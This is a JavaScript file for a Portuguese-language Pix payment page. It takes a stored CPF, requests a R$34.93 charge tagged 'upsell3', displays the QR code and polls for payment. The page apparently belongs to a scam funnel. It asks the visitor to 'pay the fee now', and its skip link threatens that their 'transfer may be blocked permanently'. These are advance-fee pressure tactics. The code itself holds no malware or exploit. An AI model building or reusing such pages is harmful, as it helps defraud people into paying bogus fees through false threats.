const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
const SUPABASE_ANON_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;

let paymentCheckInterval = null;

document.addEventListener('DOMContentLoaded', () => {
  const payButton = document.getElementById('pay-button');
  const skipLink = document.getElementById('skip-link');
  const pixModal = document.getElementById('pix-modal');
  const closeModal = document.getElementById('close-modal');
  const copyButton = document.getElementById('copy-button');

  payButton.addEventListener('click', handlePayment);
  skipLink.addEventListener('click', handleSkip);
  closeModal.addEventListener('click', closePixModal);
  copyButton.addEventListener('click', copyPixCode);
});

async function handlePayment() {
  const payButton = document.getElementById('pay-button');
  payButton.disabled = true;
  payButton.innerHTML = '<span class="button-text">PROCESSANDO...</span>';

  try {
    const cpf = localStorage.getItem('cpf');
    if (!cpf) {
      alert('Dados não encontrados. Redirecionando...');
      window.location.href = 'index.html';
      return;
    }

    const apiUrl = `${SUPABASE_URL}/functions/v1/create-pix`;
    const response = await fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        cpf: cpf,
        amount: 34.93,
        type: 'upsell3'
      })
    });

    if (!response.ok) {
      throw new Error('Erro ao criar pagamento PIX');
    }

    const data = await response.json();

    if (data.success && data.qrcode && data.transactionId) {
      displayPixQRCode(data.qrcode, data.transactionId);
      showPixModal();
      startPaymentCheck(data.transactionId);
    } else {
      throw new Error(data.error || 'Erro ao gerar PIX');
    }

  } catch (error) {
    console.error('Erro:', error);
    alert('Erro ao processar pagamento. Tente novamente.');
    payButton.disabled = false;
    payButton.innerHTML = '<span class="button-text">PAGAR TARIFA AGORA</span>';
  }
}

function displayPixQRCode(qrcodeText, transactionId) {
  const qrcodeContainer = document.getElementById('pix-qrcode');
  const pixCodeInput = document.getElementById('pix-code-input');

  qrcodeContainer.innerHTML = '';

  setTimeout(() => {
    try {
      if (typeof QRCode !== 'undefined') {
        new QRCode(qrcodeContainer, {
          text: qrcodeText,
          width: 250,
          height: 250,
          colorDark: '#000000',
          colorLight: '#ffffff',
          correctLevel: QRCode.CorrectLevel.H
        });
        console.log('QR Code gerado com sucesso');
      } else {
        console.error('Biblioteca QRCode não está disponível');
        qrcodeContainer.innerHTML = '<div style="background: #fee2e2; padding: 20px; border-radius: 8px; text-align: center;"><p style="color: #dc2626; font-size: 14px; margin: 0;">QR Code indisponível. Use o código Pix abaixo.</p></div>';
      }
    } catch (error) {
      console.error('Erro ao gerar QR Code:', error);
      qrcodeContainer.innerHTML = '<div style="background: #fee2e2; padding: 20px; border-radius: 8px; text-align: center;"><p style="color: #dc2626; font-size: 14px; margin: 0;">Erro ao gerar QR Code. Use o código Pix abaixo.</p></div>';
    }
  }, 100);

  pixCodeInput.value = qrcodeText;
}

function startPaymentCheck(transactionId) {
  if (paymentCheckInterval) {
    clearInterval(paymentCheckInterval);
  }

  let attempts = 0;
  const maxAttempts = 120;

  paymentCheckInterval = setInterval(async () => {
    attempts++;

    if (attempts >= maxAttempts) {
      clearInterval(paymentCheckInterval);
      return;
    }

    try {
      const apiUrl = `${SUPABASE_URL}/functions/v1/check-payment`;
      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ transactionId })
      });

      if (!response.ok) {
        throw new Error('Erro ao verificar pagamento');
      }

      const data = await response.json();

      if (data.paid) {
        clearInterval(paymentCheckInterval);
        window.location.href = 'confirmacao.html';
      }

    } catch (error) {
      console.error('Erro ao verificar pagamento:', error);
    }
  }, 3000);
}

function showPixModal() {
  const pixModal = document.getElementById('pix-modal');
  pixModal.classList.add('active');
}

function closePixModal() {
  const pixModal = document.getElementById('pix-modal');
  pixModal.classList.remove('active');

  if (paymentCheckInterval) {
    clearInterval(paymentCheckInterval);
  }
}

function copyPixCode() {
  const pixCodeInput = document.getElementById('pix-code-input');
  const copyButton = document.getElementById('copy-button');

  pixCodeInput.select();
  document.execCommand('copy');

  copyButton.classList.add('copied');

  setTimeout(() => {
    copyButton.classList.remove('copied');
  }, 2000);
}

function handleSkip(e) {
  e.preventDefault();

  const confirmed = confirm('Tem certeza que deseja pular esta etapa? Sua transferência pode ser bloqueada permanentemente.');

  if (confirmed) {
    window.location.href = 'confirmacao.html';
  }
}
